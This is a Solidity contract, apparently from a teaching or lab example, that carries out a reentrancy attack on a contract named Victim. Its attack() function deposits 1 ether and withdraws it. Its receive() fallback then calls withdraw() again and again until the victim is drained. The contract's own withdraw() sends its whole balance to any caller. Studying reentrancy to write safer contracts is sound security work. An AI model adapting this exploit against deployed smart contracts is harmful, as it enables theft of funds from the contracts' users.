pragma solidity 0.8.19;
// SPDX-License-Identifier: MIT
import "./ReentrancyVictim.sol";

contract Attacker{
    using SafeMath for uint256;
    Victim public victim;

    constructor(address _victim) {
        victim = Victim(_victim);
    }

    receive() external payable{
        if(address(victim).balance>1 ether){
            victim.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Send the required attack amount");
        victim.deposit{value: 1 ether}();
        victim.withdraw();
    }

    function withdraw() public{
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to withdraw Ether");

    }
}